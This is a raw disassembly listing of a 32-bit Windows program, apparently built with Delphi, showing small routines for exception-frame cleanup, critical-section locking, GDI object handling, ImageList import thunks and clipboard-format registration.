call sub_41c228
retn
sub_41caf7
jmp sub_4039c0
sub_41cb6d
jmp sub_4039c0
sub_41cb74
pop ebx
pop ecx
pop ebp
retn
sub_41cb78
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
retn
sub_41cc2e
jmp sub_4039c0
sub_41cc40
push esi
cmp dl [ eax + 0x18 ]
je r-xdata
pop esi
retn
mov [ eax + 0x18 ] dl
mov si 0xfffd
call sub_403468
sub_41cc54
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41cc84
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x18 ]
retn
sub_41cd93
jmp sub_4039c0
sub_41cd9a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_41c228
retn
sub_41cdb0
jmp sub_4039c0
sub_41ce29
jmp sub_4039c0
sub_41ce30
pop ebx
pop ecx
pop ebp
retn
sub_41cf61
jmp sub_4039c0
sub_41cf74
mov eax [ eax + 0x10 ]
mov al [ eax + 0x1c ]
retn
sub_41d2b4
push ebx
mov ebx eax
push rw-data
call EnterCriticalSection
inc [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
lea eax [ ebx + 0x38 ]
push eax
call EnterCriticalSection
pop ebx
retn
sub_41d510
jmp sub_4039c0
sub_41d517
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_41d520
push ebx
mov ebx eax
lea eax [ ebx + 0x38 ]
push eax
call LeaveCriticalSection
push rw-data
call EnterCriticalSection
dec [ ebx + 0x50 ]
push rw-data
call LeaveCriticalSection
pop ebx
retn
sub_41d558
mov eax [ eax + 0x10 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41d564
mov eax [ eax + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
retn
sub_41d6a4
retn
sub_41d76d
add [ eax ] al
add [ ebx + 0x66 ] dl
cmp [ eax + 0x32 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
sub_41d784
push ebx
cmp [ eax + 0x2a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41d870
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x2
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfd
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41d890
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x4
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xfb
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41d8b0
push ebx
mov ebx eax
test [ ebx + 0x8 ] 0x8
je r-xdata
pop ebx
retn
and [ ebx + 0x8 ] 0xf7
mov eax [ rw-data ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call SelectObject
sub_41d8d0
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
pop ebx
retn
sub_41d8e8
push ebx
mov ebx eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
pop ebx
retn
sub_41d90c
mov eax [ rw-data ]
call sub_41d8e8
retn
sub_41d96e
jmp sub_4039c0
sub_41d975
pop ecx
pop ebp
retn
sub_41da14
jmp sub_4039c0
sub_41da1b
pop ebx
mov esp ebp
pop ebp
retn
sub_41daed
jmp sub_4039c0
sub_41db7e
jmp sub_4039c0
sub_41db85
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41dbb0
dec ecx
imul edx
add eax ecx
not ecx
and eax ecx
test eax eax
jns r-xdata
sar eax 0x3
retn
add eax 0x7
sub_41dc97
jmp sub_4039c0
sub_41de44
jmp sub_4039c0
sub_41de4b
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x28
sub_41e05d
jmp sub_4039c0
sub_41e064
lea eax [ ebp - 0x408 ]
push eax
call CreatePalette
pop ebx
mov esp ebp
pop ebp
retn
sub_41e0fe
jmp sub_4039c0
sub_41e2da
jmp sub_4039c0
sub_41e394
jmp sub_4039c0
sub_41e39b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e3bb
mov eax [ ebp - 0x10 ]
push eax
push 0x0
call ReleaseDC
retn
sub_41e3b4
jmp sub_4039c0
sub_41e3bb
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_41e549
jmp sub_4039c0
sub_41e714
jmp sub_4039c0
sub_41e71b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e73e
mov eax [ ebp - 0x40 ]
mov edx [ eax + 0x8 ]
mov eax [ ebp - 0x2c ]
call sub_4026dc
retn
sub_41e737
jmp sub_4039c0
sub_41e73e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41e75e
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
call sub_4026dc
retn
sub_41e757
jmp sub_4039c0
sub_41e75e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_41e768
xor ecx ecx
mov edx eax
add eax 0x14
jmp r-xdata
cmp edx eax
jl r-xdata
xor cx [ edx ]
add edx 0x2
mov eax ecx
retn
sub_41e8c8
push 0x0
call sub_41e864
retn
sub_41e96d
jmp sub_4039c0
sub_41e974
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41e980
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
push 0x0
call sub_41e8d0
pop ebx
pop ebp
retn 0x4
sub_41e994
retn
sub_41e998
test eax eax
jne r-xdata
retn
call sub_41e994
sub_41eb6b
jmp sub_4039c0
sub_41eb92
jmp sub_4039c0
sub_41eb99
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41ebd8
push ebx
mov [ eax + 0x20 ] 0x1
cmp [ eax + 0x12 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x14 ]
call [ ebx + 0x10 ]
sub_41eda5
mov eax [ ebp - 0xc ]
call sub_40326c
retn
sub_41edae
jmp sub_4039c0
j_sub_41eda5
jmp sub_41eda5
sub_41edb5
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40326c
retn
sub_41edcb
jmp sub_4039c0
sub_41eddc
xor eax eax
retn
sub_41ede0
mov al [ eax + 0x21 ]
retn
sub_41ee2c
jmp sub_4039c0
sub_41ee33
pop esi
pop ecx
pop ebp
retn
sub_41ee60
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
retn
sub_41eeb7
jmp sub_4039c0
sub_41eebe
pop esi
pop ecx
pop ebp
retn
sub_41eec4
retn
sub_41eec8
cmp dl [ eax + 0x21 ]
je r-xdata
retn
mov [ eax + 0x21 ] dl
mov edx eax
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_41eed8
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop esi
retn
sub_41f05d
jmp sub_4039c0
sub_41f064
mov eax esi
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_41f183
jmp sub_4039c0
sub_41f18a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41f212
jmp sub_4039c0
sub_41f219
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41f374
jmp sub_40370c
sub_41f3d4
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41ef80
mov [ rw-data ] eax
sub_41f3f4
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_41f284
mov [ rw-data ] eax
sub_41f51c
push ebx
mov ebx eax
mov edx [ r-xdata ]
mov eax ebx
call sub_41f4b8
mov eax [ ebx + 0xc ]
pop ebx
retn
sub_41f5c4
jmp sub_40370c
sub_41f65b
jmp sub_40370c
sub_41f6d4
push ebx
mov ebx edx
call sub_41f3f4
mov edx ebx
call sub_41f398
test eax eax
setne al
pop ebx
retn
sub_41f6ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_41f51c
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
pop ebx
retn
sub_41f704
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_41f51c
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop edi
pop esi
retn
sub_41f84d
jmp sub_40370c
sub_41f8cb
jmp sub_4039c0
sub_41f8d2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41fa6c
retn
sub_41fc0c
cmp [ eax + 0x28 ] 0x0
sete al
retn
sub_41ff10
jmp sub_4039c0
sub_41ff17
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42008f
jmp sub_4039c0
sub_420096
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_420125
jmp sub_4039c0
sub_42012c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42014e
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fe0
retn
sub_420147
jmp sub_4039c0
sub_42014e
pop ebx
mov esp ebp
pop ebp
retn
sub_420161
add [ eax ] al
add [ ebx + 0x74002878 ] al
adc al [ eax + 0x74002c78 ]
pop es
call sub_420448
jmp r-xdata
retn
sub_420177
call sub_4204d4
retn
sub_42026c
retn
sub_4204c4
jmp sub_4039c0
sub_4205ef
jmp sub_4039c0
sub_4205f6
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_42060f
jmp sub_4039c0
sub_4207e6
jmp sub_4039c0
sub_42080e
jmp sub_4039c0
sub_420815
mov esp ebp
pop ebp
retn
sub_42088c
jmp sub_4039c0
sub_420994
jmp sub_4039c0
sub_420a7f
jmp sub_4039c0
sub_420a8c
inc [ eax + 0x4 ]
retn
sub_420c07
jmp sub_4039c0
sub_420fb8
jmp sub_4039c0
sub_421202
jmp sub_4039c0
sub_42122c
jmp sub_4039c0
sub_421233
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_421255
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_42124e
jmp sub_4039c0
sub_42125f
jmp sub_40370c
sub_4212ae
jmp sub_4039c0
sub_4214db
jmp sub_4039c0
sub_421523
jmp sub_4039c0
sub_421690
jmp sub_4039c0
sub_421757
jmp sub_40370c
sub_4217ac
mov [ eax + 0x31 ] 0x0
call sub_41ebd8
retn
sub_4219fd
jmp sub_4039c0
sub_421a68
jmp sub_4039c0
sub_421a6f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_421ae0
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_421b94
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_421ba4
push ebx
mov ebx eax
mov eax ebx
call sub_421d5c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_421bb8
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_421bd4
push ebx
mov ebx eax
mov eax ebx
call sub_421dbc
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_421c30
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_421d3f
jmp sub_4039c0
sub_421fa3
jmp sub_40370c
sub_422003
jmp sub_4039c0
sub_42200a
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_4223eb
jmp sub_4039c0
sub_422417
jmp sub_4039c0
sub_42247e
jmp sub_40370c
sub_4224af
jmp sub_4039c0
sub_422534
jmp sub_40370c
sub_422539
mov eax [ ebp - 0x38 ]
call sub_40326c
call sub_403a20
call sub_403a74
sub_42254b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422568
mov eax [ ebp - 0x18 ]
call sub_4026dc
retn
sub_422561
jmp sub_4039c0
sub_4226b7
jmp sub_40370c
sub_422983
jmp sub_40370c
sub_422a64
mov cl 0x1
call sub_422a6c
retn
sub_422d21
add [ eax ] al
add [ ebx ] dh
leave
call sub_422a6c
retn
sub_422da6
jmp sub_40370c
sub_422dab
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_403a20
call sub_403a74
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_422dfc
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_422f35
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_422f64
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_422f78
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_423091
jmp sub_40370c
sub_423146
jmp sub_40370c
sub_4231b0
jmp sub_40370c
sub_4231e4
push ebx
mov ebx eax
xor ecx ecx
mov eax ebx
call sub_423170
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_4231fc
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41d8d0
retn
mov [ eax + 0x30 ] edx
retn
sub_423214
retn
sub_423218
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_41d8d0
retn
mov [ eax + 0x2c ] edx
retn
sub_423258
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41d8d0
pop ebp
retn 0x4
sub_42326c
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_41d8d0
pop ebp
retn 0x4
sub_42342c
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_423438
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_4234e5
jmp sub_4039c0
sub_4234ec
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4235d7
jmp sub_40370c
sub_423643
jmp sub_4039c0
sub_423771
jmp sub_4039c0
sub_423778
pop ebp
retn
sub_423878
cmp edx eax
jg r-xdata
retn
mov eax edx
sub_4238ad
jmp sub_4039c0
sub_4238b4
pop ebp
retn
sub_4238b8
sub [ rw-data ] 0x1
retn
sub_423b00
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_4139c8
retn
sub_423b34
mov eax [ eax + 0x4 ]
call sub_41386c
retn
sub_423b65
jmp sub_4039c0
sub_423b6c
pop ebp
retn
sub_423b70
sub [ rw-data ] 0x1
retn
ImageList_Create
jmp [ __import_lookup_table_12(comctl32:ImageList_Create) ]
ImageList_Destroy
jmp [ __import_lookup_table_12(comctl32:ImageList_Destroy) ]
ImageList_GetImageCount
jmp [ __import_lookup_table_12(comctl32:ImageList_GetImageCount) ]
ImageList_ReplaceIcon
jmp [ ImageList_ReplaceIcon@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
ImageList_Replace
jmp [ ImageList_Replace@IAT ]
ImageList_Remove
jmp [ ImageList_Remove@IAT ]
ImageList_BeginDrag
jmp [ ImageList_BeginDrag@IAT ]
ImageList_EndDrag
jmp [ ImageList_EndDrag@IAT ]
ImageList_DragEnter
jmp [ ImageList_DragEnter@IAT ]
ImageList_DragLeave
jmp [ __import_lookup_table_12(comctl32:ImageList_DragLeave) ]
ImageList_DragMove
jmp [ __import_lookup_table_12(comctl32:ImageList_DragMove) ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_GetDragImage
jmp [ ImageList_GetDragImage@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ __import_lookup_table_12(comctl32:ImageList_GetIconSize) ]
ImageList_SetIconSize
jmp [ ImageList_SetIconSize@IAT ]
sub_423c61
jmp sub_4039c0
sub_423c68
pop ebp
retn
sub_423c6c
sub [ rw-data ] 0x1
retn
sub_423d33
jmp sub_4039c0
sub_423d3a
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_424350
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_423d5c
mov [ rw-data ] sub_423e74
mov [ rw-data ] sub_423de4
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_424078
mov [ rw-data ] sub_42414c
mov [ rw-data ] sub_424220
retn
sub_4243e1
jmp sub_4039c0
sub_4243e8
pop ebp
retn
sub_4243ec
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_424350
sub_424421
jmp sub_4039c0
sub_424428
pop ebp
retn
sub_42442c
sub [ rw-data ] 0x1
retn
sub_42486e
jmp sub_4039c0
sub_424875
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_424a85
jmp sub_4039c0
sub_424a8c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424c41
jmp sub_4039c0
sub_424ca6
jmp sub_4039c0
sub_424cad
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424d99
jmp sub_4039c0
sub_424da0
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_424fb0
lea eax [ ebp - 0x30 ]
call sub_403fbc
lea eax [ ebp - 0x20 ]
call sub_403fbc
retn
sub_424fc1
jmp sub_4039c0
j_sub_424fb0
jmp sub_424fb0
sub_424fc8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4250c3
jmp sub_4039c0
sub_4250ca
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4251c7
jmp sub_4039c0
sub_4251ce
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42522e
lea eax [ ebp - 0x4 ]
call sub_405628
retn
sub_425237
jmp sub_4039c0
j_sub_42522e
jmp sub_42522e
sub_42523e
pop ebx
pop ecx
pop ebp
retn
sub_4252d9
jmp sub_4039c0
sub_4252e0
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_4252ec
mov eax [ eax + 0x20 ]
retn
sub_42541b
jmp sub_4039c0
sub_425422
pop ebp
retn
sub_425424
sub [ rw-data ] 0x1
retn
sub_425451
jmp sub_4039c0
sub_425458
pop ebp
retn
sub_42545c
sub [ rw-data ] 0x1
retn
sub_425495
jmp sub_4039c0
sub_42549c
pop ebp
retn
sub_4254a0
sub [ rw-data ] 0x1
retn
sub_4257ad
jmp sub_4039c0
sub_4257b4
pop ebp
retn
sub_4257b8
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_425504
sub_425898
retn
sub_42590c
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_425918
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_425924
mov edx [ eax ]
call [ edx ]
retn
sub_42592c
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_425959
jmp sub_4039c0
sub_425960
pop ebp
retn
sub_425964
sub [ rw-data ] 0x1
retn
sub_425b23
jmp sub_4039c0
sub_425b2a
pop ebp
retn
sub_425edf
jmp sub_4039c0
sub_425ee6
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_426300
jmp sub_4039c0
sub_426307
pop ebp
retn
sub_42630c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42589c
mov [ rw-data ] eax
sub_42634d
jmp sub_4039c0
sub_426354
pop ebp
retn
sub_426358
sub [ rw-data ] 0x1
retn
sub_426385
jmp sub_4039c0
sub_42638c
pop ebp
retn
sub_426390
sub [ rw-data ] 0x1
retn
sub_4263bd
jmp sub_4039c0
sub_4263c4
pop ebp
retn
sub_4263c8
sub [ rw-data ] 0x1
retn
sub_4263f5
jmp sub_4039c0
sub_4263fc
pop ebp
retn
sub_426400
sub [ rw-data ] 0x1
retn
sub_42642d
jmp sub_4039c0
sub_426434
pop ebp
retn
sub_426438
sub [ rw-data ] 0x1
retn
sub_426465
jmp sub_4039c0
sub_42646c
pop ebp
retn
sub_426470
sub [ rw-data ] 0x1
retn
sub_42649d
jmp sub_4039c0
sub_4264a4
pop ebp
retn
sub_4264a8
sub [ rw-data ] 0x1
retn
sub_4264d5
jmp sub_4039c0
sub_4264dc
pop ebp
retn
sub_4264e0
sub [ rw-data ] 0x1
retn
sub_42650d
jmp sub_4039c0
sub_426514
pop ebp
retn
sub_426518
sub [ rw-data ] 0x1
retn
sub_426792
jmp sub_40370c
sub_426797
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45e9a8
call sub_403a74
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4267b4
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_4267bc
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_403468
pop esi
retn
sub_4267d4
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_403468
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_4267ec
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_426895
jmp sub_4039c0
sub_4268c3
jmp sub_4039c0
sub_4268ca
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4268d4
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4268e8
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_426b46
jmp sub_4039c0
sub_426b4d
pop ebp
retn
sub_426fd8
fiadd [ ebx ]
hlt
sub_428672
jmp sub_40370c
sub_42872b
jmp sub_4039c0
sub_428732
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_428738
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_4286ac
sub_428748
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_4286ac
sub_428758
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_4286ac
pop ebp
retn 0x8
sub_428770
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_428a0d
jmp sub_40370c
sub_428b80
retn
sub_428d0d
jmp sub_4039c0
sub_428d90
push ebx
mov ebx eax
mov eax ebx
call sub_43ffcc
mov eax ebx
call sub_428b84
pop ebx
retn
sub_428da4
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_4406ec
mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_428ecc
pop ebx
retn
sub_428ebc
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_428f95
jmp sub_4039c0
sub_428f9c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_428fe4
push ebx
mov ebx eax
mov eax ebx
call sub_443c54
mov eax ebx
call sub_428b84
pop ebx
retn
sub_428ff8
push ebx
mov ebx eax
mov eax ebx
call sub_433a14
mov eax ebx
call sub_428b84
pop ebx
retn
sub_42900c
mov al 0x1
retn
sub_429010
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_429743
jmp sub_4039c0
sub_4297b0
jmp sub_4039c0
sub_4298cc
push ebx
lea ebx [ eax + 0x190 ]
push ebx
lea ebx [ eax + 0x1ac ]
push ebx
call sub_4297f8
pop ebx
retn
sub_429a18
mov [ eax + 0x16d ] dl
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_429b40
mov ecx [ edx ]
sub [ eax ] ecx
mov ecx [ edx + 0x4 ]
sub [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
add [ eax + 0x8 ] ecx
mov edx [ edx + 0xc ]
add [ eax + 0xc ] edx
retn
sub_429c9c
push ebx
mov ebx edx
mov edx ebx
call sub_441584
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_42a819
jmp sub_4039c0
sub_42ac35
jmp sub_4039c0
sub_42ac3c
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ac48
cmp edx [ eax + 0x230 ]
je r-xdata
retn
mov [ eax + 0x230 ] edx
sub_42ac58
cmp dl [ eax + 0x234 ]
je r-xdata
retn
mov [ eax + 0x234 ] dl
sub_42ac68
retn
sub_42b550
call sub_42b560
test eax eax
je r-xdata
xor eax eax
retn
mov eax [ eax ]
retn
sub_42b69f
jmp sub_4039c0
sub_42bb60
push ebx
cmp [ eax + 0x24a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x24c ]
call [ ebx + 0x248 ]
sub_42bbb0
xor edx edx
mov ecx [ eax + 0x22c ]
mov ecx [ ecx + 0xc ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov eax ecx
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx eax
sub_42bbcc
push esi
mov esi eax
mov eax [ esi + 0x22c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42be61
jmp sub_4039c0
sub_42be99
jmp sub_4039c0
sub_42c228
jmp sub_4039c0
sub_42c22f
pop ebp
retn
sub_42c234
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403d44
mov eax [ r-xdata ]
call sub_413204
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413250
sub_42c289
jmp sub_4039c0
sub_42c290
pop ebp
retn
sub_42c294
sub [ rw-data ] 0x1
retn
sub_42c36c
jmp sub_4039c0
sub_42c373
pop ecx
pop ebp
retn
sub_42c378
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov [ ebx + 0xd ] 0x1
sub_42c4ae
jmp sub_4039c0
sub_42c4b5
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42c55e
jmp sub_4039c0
sub_42c5c4
jmp sub_4039c0
sub_42c5cb
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42c629
jmp sub_4039c0
sub_42c630
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42c715
jmp sub_4039c0
sub_42c71c
pop ebx
mov esp ebp
pop ebp
retn
sub_42c799
jmp sub_4039c0
sub_42c7a0
pop ebx
mov esp ebp
pop ebp
retn
sub_42c83e
jmp sub_40370c
sub_42c8d5
jmp sub_4039c0
sub_42c8dc
pop ebp
retn
sub_42c8e0
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_42c95c
retn
sub_42c95d
jmp sub_4039c0
j_sub_42c95c
jmp sub_42c95c
sub_42c964
pop ebp
retn
sub_42c968
sub [ rw-data ] 0x1
retn
sub_42d3b0
mov eax [ eax + 0x4 ]
cmp [ eax + 0x8 ] 0x0
sete al
retn
sub_42db33
jmp sub_4039c0
sub_42db6f
jmp sub_4039c0
sub_42e76c
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403fe0
retn
sub_42e77a
jmp sub_4039c0
j_sub_42e76c
